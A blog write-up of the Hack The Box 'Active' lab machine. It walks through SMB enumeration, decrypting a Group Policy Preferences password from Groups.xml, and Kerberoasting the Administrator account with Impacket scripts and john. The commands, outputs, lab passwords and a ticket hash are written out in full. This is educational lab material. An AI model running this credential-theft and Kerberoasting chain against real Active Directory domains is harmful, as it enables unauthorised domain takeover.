layout: post
os: windows
machine_name: 
title: Active machine writeup
subtitle: Very cool machine that involve kerberos and Impacket's scripts usage.
categories: HTB
cover-img: /assets/img/kerberos-windows.png
thumbnail-img: /assets/img/active-htb.png
tags: [HTB, ASREProast, Kerberos]
comments: true

# Recon

## nmap

```bash
nmap -sC -sV -p- -A -oA allscripts 10.10.10.100

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-05 14:04:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msdfsr?
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  winrm?
| fingerprint-strings: 
|   JavaRMI: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/html; charset=us-ascii
|     Server: Microsoft-HTTPAPI/2.0
|     Date: Sun, 05 Dec 2021 14:04:35 GMT
|     Connection: close
|     Content-Length: 326
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
|     <HTML><HEAD><TITLE>Bad Request</TITLE>
|     <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
|     <BODY><h2>Bad Request - Invalid Verb</h2>
|     <hr><p>HTTP Error 400. The request verb is invalid.</p>
|_    </BODY></HTML>
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  unknown
49169/tcp open  unknown
49171/tcp open  unknown
49180/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port47001-TCP:V=7.91%I=7%D=12/5%Time=61ACC6F1%P=x86_64-pc-linux-gnu%r(J
SF:avaRMI,1F9,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
SF:/html;\x20charset=us-ascii\r\nServer:\x20Microsoft-HTTPAPI/2\.0\r\nDate
SF::\x20Sun,\x2005\x20Dec\x202021\x2014:04:35\x20GMT\r\nConnection:\x20clo
SF:se\r\nContent-Length:\x20326\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-/
SF:/W3C//DTD\x20HTML\x204\.01//EN\"\"http://www\.w3\.org/TR/html4/strict\.
SF:dtd\">\r\n<HTML><HEAD><TITLE>Bad\x20Request</TITLE>\r\n<META\x20HTTP-EQ
SF:UIV=\"Content-Type\"\x20Content=\"text/html;\x20charset=us-ascii\"></HE
SF:AD>\r\n<BODY><h2>Bad\x20Request\x20-\x20Invalid\x20Verb</h2>\r\n<hr><p>
SF:HTTP\x20Error\x20400\.\x20The\x20request\x20verb\x20is\x20invalid\.</p>
SF:\r\n</BODY></HTML>\r\n");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.10: 
|_    Message signing enabled and required
|_smb2-time: Protocol negotiation failed (SMB2)

```

![Jymme](https://media0.giphy.com/media/ZPUYCAXNj9M3d4hXXb/giphy.gif?cid=790b7611784c8d772d268a09a1eb292b0d9d544dbaa45e41&rid=giphy.gif&ct=g)

Calm down, after your 5th windows machine you'll figure out that a good start is to lookup for SMB shares because an initial information can exposed there - Not always! I can say equally that if port 443 or 80 were open, I'll jump right into it! It's dynamic and in time, you will develop the right intuition.

## SMB | TCP 445/139

```bash
└─$ smbclient -L //10.10.10.100/                                                         
Enter WORKGROUP\nave's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk
```

The unusual shares are: "Replication, Users". As Anonymous user we have access only to Replication share (you can know that with a try and with a tool called - 'smbmap') and because I want to enumerate as much as I can, I'll use the following option to list all the share files:

```bash
└─$ smbclient -N //10.10.10.100/Replication -c "recurse ON; ls"
\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
  .                                   D        0  Sat Jul 21 13:37:44 2018
  ..                                  D        0  Sat Jul 21 13:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 23:46:06 2018
```

(Please use this 'c' flag when you have access to SMB share, it'll give you a confidence that you don't miss a thing)

# Foothold

### Groups.xml

Groups.xml - When a new GPP is created, this XML file created in SYSVOL (in our case 'Replication' is replication share of SYSVOL) with the relevant configuration data:

```bash
└─$ get Groups.xml
└─$ cat Groups.xml
	<?xml version="1.0" encoding="utf-8"?>
	<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

```bash
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
userName="active.htb\SVC_TGS"
```

### Decrypt GPP passwords

After google: "groups.xml cpassword decrypt" I found the following tool:
https://github.com/t0thkr1s/gpp-decrypt

```bash
└─$ python3 gpp-decrypt.py -f Groups.xml
[ * ] Username: active.htb\SVC_TGS
[ * ] Password: GPPstillStandingStrong2k18
```

### Users share

```bash
└─$ smbclient -U 'active.htb\SVC_TGS' //10.10.10.100/Users
smb: \> cd SVC_TGS
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

user.txt - DONE.

# Administrator account

## Kerberos | Port 88

If we pick the Kerberos as a vector attack, a good way to start with is to check for users that have the property ‘Do not require Kerberos preauthentication’ set (UF_DONT_REQUIRE_PREAUTH).

A good tool to do that is GetNPUser.py. This tool needed a usernames list which we can invoke with GetADUsers.py.

```bash
└─$ GetADUsers.py -all active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100                                                                                                
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 22:06:40.351723  2021-01-21 18:07:03.723783 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 21:50:36.972031  <never>             
SVC_TGS                                               2018-07-18 23:14:38.402764  2022-01-03 20:39:44.481535
```

GetADUsers.py make use of LDAP server.

Now let's make a list with the users above. After we create it, we'll run GetNPUsers.py tool.

```bash
└─$ GetNPUsers.py -dc-ip 10.10.10.100 active.htb/ -usersfile users -format john -outputfile target_hashes 
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User SVC_TGS doesn't have UF_DONT_REQUIRE_PREAUTH set
```

As we can see, no one got this option and two of them has Check Account Policy (for more: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/e19be8b8-9130-40a4-9cd1-92d0cbd46a51).
This technique doesn't worked.

![Crepe](https://media3.giphy.com/media/vyTnNTrs3wqQ0UIvwE/giphy.gif?cid=ecf05e47oy3ykn5lvqq3fr3jedvnar84s4adpyhdu2jsyd39&rid=giphy.gif&ct=g)

If you prepare to the OSCP be ready for situations like that.

## GetUserSPNs

SPN = Service Principal Name, is a name that point to the actual domain account who running a service.

```bash
└─$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -outputfile active.kirbi -dc-ip 10.10.10.100
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 

--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------

active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 22:06:40.351723  2021-01-21 18:07:03.723783             



[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

Here we can see that the administrator account, host the CIFS (SMB) service. Along with the tool flag "-outputfile" we tried to extract the account Ticket Granting Service which consist the Administrator NTLM hash password that we'll carack offline. But look at the error above: "Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)", we can see that there is a time synchronization problem. Thanks to: https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast we can fix the problem with setting our kali time to the target time, this will done with 'ntpdate' command:

```bash
└─$ sudo ntpdate 10.10.10.100

Great, now we'll execute this command again and see the TGS:
└─$ cat active.kirbi            
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$7f0795adeaad1cfc38ee209f18b60b26$0764221b49cd4dcce179cd160c32434cd77b980c92375640c327168dd4dce30ff6ba66620d1c402dcaf36cb52ab206a1956d897f3f572ca55c486ad9edb79d15a02bdca4464da2d4a15d6010c463c872f242f8cc41c70e13f0ac7aa7d5eb6640c31ed7fe4aff230e432a66074dc20a0b96486a1cec496e34318fa96ab545fb873e5451452e080c959a395380106494ee1a90dfba320c9a643d722d4e625ac933c25da9c9f9f9df5ad3643ab8fa533ebff11124b70da547461d4a630556b709ee16c37686f4d69dd07345a0dbf49233f48fda1418e73b4a93848969cf2c87c276d6402c02f1f667bb80755babc8cfe1254cf60ebdcc559d6e5b20beb8109995d91b87ab85ec23268998763eb890df2da506963c7fa2f0d19be8f0d71ab1e0be43efe0cc70b221244a4471ed51e771d4812177dde91f299746ef5d22c9efbb20439697f14fd8d0971b9be0604656c2ad41819ec9a62520ef8e54a46d30ce0f5f1d7f39ddec1e15b0b42e6d6332cb97eb607dd6a75ac0c0de41fa6f58d66e9b4b782f3a3ac2862c846084ad2691188db7b241f6edfe2f97e16ddef1df878b8339665fe443caae6113b6451d40e70a4acc0ff484cb1098e43e09d9edcf3208e957c39c734f72aa087a39af68bb40951afc6d15bd62e982696d4fb486e270c83706505dd124eb0fd278f5f205617837ea95ab20c89586f5f6dca6dd9ab97459e127ff94125f9122afd88037683ab53f398333c40946505b4d3bf2b4b1e28c226973e416a6076d10a288558dc57a479138b00c631e34bfdae331d118af2989488f9c7488e500e6a5f9502b37272e330aa6c1e63797cb6d08fe97bd05f2802ced6dfbbc1678e9c096e5ef15cb72cb12032f658fe7faeefe4145bb926faa1ee2ddb3fe936f6fe0580def8a2b191758205ea8813bd397af477c49eb1e4fb1d71e8452f8b511c130b3809f0ac0c52acde7befbd5dc47eecb9aad4551f4862db86d9476790e85e43b971a1bbec1fae8b5af3e552c518190cd361a594e2bd3a2a8558d26b2c6da2bb543a69bc37fc611d993886f23cae1b4ff1afe8adacb3eeaa3d82cd97ff2260428467431d24d3c336c9afe98676656da1f06cef4db7bcafaecdd412b3b22c4db708fb359b03b13f4b94259626b0c61ae6ccd6aaed747bf48af96aa7d62b65400d031345738b474b66309a9ff0867b22b5a6c0d433411837051c441f854b12a716e8a46b2e6098c817c847c896f2159ac348b7f2bf9d020d0
```

```bash
└─$ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt active.kirbi 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
No password hashes left to crack (see FAQ)

(Here is said that I already execute john)
└─$ john --show active.kirbi                                                                                                                                                             
?:Ticketmaster1968

1 password hash cracked, 0 left
```

Great! Now let's sign into the SMB Users share to extract the flag:

```bash
└─$ smbclient -U 'active.htb\Administrator' //10.10.10.100/Users      
Enter ACTIVE.HTB\Administrator's password: Ticketmaster1968

smb: \> cd Administrator
smb: \Administrator\> cd Desktop
smb: \Administrator\Desktop\> get root.txt
```

Thanks folks and if you don't understand something DM me :)
